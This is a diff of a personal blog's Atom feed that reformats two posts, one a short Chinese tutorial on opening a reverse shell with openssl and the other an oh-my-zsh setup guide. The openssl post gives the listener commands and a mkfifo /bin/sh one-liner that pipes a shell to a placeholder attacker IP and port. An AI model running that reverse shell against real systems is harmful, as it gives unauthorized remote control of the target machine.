@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-04-09T04:31:25.434Z</updated>
+  <updated>2019-04-09T04:48:31.545Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,20 +21,26 @@
     <link href="http://yoursite.com/2019/04/09/openssl-shell/"/>
     <id>http://yoursite.com/2019/04/09/openssl-shell/</id>
     <published>2019-04-09T03:44:35.000Z</published>
-    <updated>2019-04-09T04:31:25.434Z</updated>
+    <updated>2019-04-09T04:48:31.545Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="openssl-shell"><a href="#openssl-shell" class="headerlink" title="openssl-shell"></a>openssl-shell</h3><p>利用openssl反弹shell</p><blockquote><ol><li>在远程攻击主机上生成秘钥文件<pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><img src="/2019/04/09/openssl-shell/f10812e1-fb84-44a9-931f-5512228828e3\1a56c38b.png" alt="1a56c38b.png"><br><img src="/2019/04/09/openssl-shell/openssl-1.png" alt="openssl-1.png"></li><li>在远程攻击主机上启动监视器<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;</code></pre><img src="/2019/04/09/openssl-shell/f10812e1-fb84-44a9-931f-5512228828e3\bbdcd0f3.png" alt="bbdcd0f3.png"><br><img src="/2019/04/09/openssl-shell/openssl-2.png" alt="openssl-2.png"></li><li>在目标机上反弹shell<pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre><img src="/2019/04/09/openssl-shell/f10812e1-fb84-44a9-931f-5512228828e3\976eea12.png" alt="976eea12.png"><br><img src="/2019/04/09/openssl-shell/openssl-3.png" alt="openssl-3.png"></li></ol></blockquote><blockquote><ol start="4"><li>refer</li></ol></blockquote><p><a href="https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998" target="_blank" rel="noopener">https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998</a></p>]]></content>
+    <content type="html"><![CDATA[<p>利用openssl反弹shell</p><hr><blockquote><p><strong>1. 在远程攻击主机上生成秘钥文件</strong></p></blockquote><pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-1.png" alt="openssl-1.png"></p><hr><blockquote><p><strong>2. 在远程攻击主机上启动监视器</strong></p></blockquote><pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-2.png" alt="openssl-2.png"></p><hr><blockquote><p><strong>3. 在目标机上反弹shell</strong></p></blockquote><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-3.png" alt="openssl-3.png"></p><hr><blockquote><p><strong>4. refer</strong></p></blockquote><p><a href="https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998" target="_blank" rel="noopener">https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998</a></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h3 id=&quot;openssl-shell&quot;&gt;&lt;a href=&quot;#openssl-shell&quot; class=&quot;headerlink&quot; title=&quot;openssl-shell&quot;&gt;&lt;/a&gt;openssl-shell&lt;/h3&gt;&lt;p&gt;利用openssl反弹shell&lt;/p&gt;
-&lt;bloc
+        &lt;p&gt;利用openssl反弹shell&lt;/p&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;1. 在远程攻击主机上生成秘钥文件&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;openssl req -x509 -newkey rsa:4
       
     
     </summary>
     
+    
+      <category term="skills" scheme="http://yoursite.com/tags/skills/"/>
     
   </entry>
   
@@ -43,15 +49,20 @@
     <link href="http://yoursite.com/2019/04/08/oh-my-zsh/"/>
     <id>http://yoursite.com/2019/04/08/oh-my-zsh/</id>
     <published>2019-04-08T06:01:51.000Z</published>
-    <updated>2019-04-08T06:41:15.550Z</updated>
+    <updated>2019-04-09T04:44:23.463Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="Install-Oh-my-zsh-In-Linux"><a href="#Install-Oh-my-zsh-In-Linux" class="headerlink" title="Install Oh-my-zsh In Linux"></a>Install Oh-my-zsh In Linux</h3><blockquote><p><strong>Install</strong></p></blockquote><pre><code class="shell">apt install -y gitapt install -y zshsh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;sh -c &quot;$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</code></pre><hr><blockquote><p><strong>My Theme</strong></p></blockquote><ul><li>1</li></ul><pre><code class="shell">cd .oh-my-zsh/custom/themes/vim robbyrussell-ascii.zsh-theme</code></pre><ul><li>2</li></ul><pre><code class="shell">local ret_status=&quot;%(?:%{$fg[green]%}&gt;:%{$fg[red]%}&gt;%s)&quot;PROMPT=&#39;${ret_status} %{$fg[cyan]%}%~ %{$reset_color%} $(git_prompt_info) # &#39;ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%{$fg[blue]%}git:(%{$fg[red]%}&quot;ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%{$reset_color%} &quot;ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%{$fg[blue]%}) %{$fg[yellow]%}x%{$reset_color%}&quot;ZSH_THEME_GIT_PROMPT_CLEAN=&quot;%{$fg[blue]%})&quot;</code></pre><ul><li>3</li></ul><pre><code class="shell">vim .zshrcZSH_THEME=&quot;robbyrussell-ascii&quot;</code></pre><hr><blockquote><p><strong>效果如图</strong></p></blockquote><p><img src="/2019/04/08/oh-my-zsh/oh-my-zsh.png" alt="oh-my-zsh.png"></p>]]></content>
+    <content type="html"><![CDATA[<p>Install Oh-my-zsh In Linux</p><hr><blockquote><p><strong>1. Install</strong></p></blockquote><pre><code class="shell">apt install -y gitapt install -y zshsh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;sh -c &quot;$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</code></pre><hr><blockquote><p><strong>2. My Theme</strong></p></blockquote><ul><li>1</li></ul><pre><code class="shell">cd .oh-my-zsh/custom/themes/vim robbyrussell-ascii.zsh-theme</code></pre><ul><li>2</li></ul><pre><code class="shell">local ret_status=&quot;%(?:%{$fg[green]%}&gt;:%{$fg[red]%}&gt;%s)&quot;PROMPT=&#39;${ret_status} %{$fg[cyan]%}%~ %{$reset_color%} $(git_prompt_info) # &#39;ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%{$fg[blue]%}git:(%{$fg[red]%}&quot;ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%{$reset_color%} &quot;ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%{$fg[blue]%}) %{$fg[yellow]%}x%{$reset_color%}&quot;ZSH_THEME_GIT_PROMPT_CLEAN=&quot;%{$fg[blue]%})&quot;</code></pre><ul><li>3</li></ul><pre><code class="shell">vim .zshrcZSH_THEME=&quot;robbyrussell-ascii&quot;</code></pre><hr><blockquote><p><strong>3. 效果如图</strong></p></blockquote><p><img src="/2019/04/08/oh-my-zsh/oh-my-zsh.png" alt="oh-my-zsh.png"></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h3 id=&quot;Install-Oh-my-zsh-In-Linux&quot;&gt;&lt;a href=&quot;#Install-Oh-my-zsh-In-Linux&quot; class=&quot;headerlink&quot; title=&quot;Install Oh-my-zsh In Linux&quot;&gt;&lt;/a&gt;Install 
+        &lt;p&gt;Install Oh-my-zsh In Linux&lt;/p&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;1. Install&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;apt install -y
       
     
     </summary>
